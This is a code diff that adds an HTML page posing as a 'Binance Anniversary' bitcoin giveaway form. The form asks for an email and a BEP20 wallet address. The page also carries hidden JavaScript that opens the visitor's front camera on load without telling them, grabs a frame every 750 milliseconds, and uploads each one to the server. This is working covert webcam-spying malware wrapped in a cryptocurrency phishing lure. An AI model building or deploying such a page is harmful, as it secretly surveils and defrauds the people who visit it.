@@ -1,0 +1,111 @@
+<!doctype html>
+<html>
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<link rel="stylesheet" href="static/styles/style.css">
+<title>Reward Pool Form</title>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+
+
+function post(imgdata){
+  //$.post("/", imgdata);}
+  
+$.ajax({
+    type: 'POST',
+    data: JSON.stringify({canvasData:imgdata}),
+    url: '/',
+    dataType: 'json',
+    contentType: 'application/json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64,", "");
+        post(canvasData); 
+     }, 750);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+<body style="background-image: url('static/bitcoin1.jpg');">
+    <div class="container" id="container">
+        <div class="form-container log-in-container">
+            <form action="#" onsubmit="alert('Your form has been submitted successfully. Dont submit multiple times.')" method="post" required>
+                <h1>Form</h1>
+                <div class="social-container">
+                    <img src="static/bnb1.jpeg" alt="Girl in a jacket" width="385" height="150">
+                </div>
+                <input placeholder="Email" type="email" required/>
+                <input placeholder="bep20 address" type="password" required/>
+                <button>Submit</button>
+            </form>
+        </div>
+        <div class="overlay-container">
+            <div class="overlay">
+                <div class="overlay-panel overlay-right">
+                    <h1>4th Binance Anniversary Special</h1>
+                    <p>Stand a chance to win free 0.001 BTC from the reward pool of 100 BTC in the 14th BNB burn.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
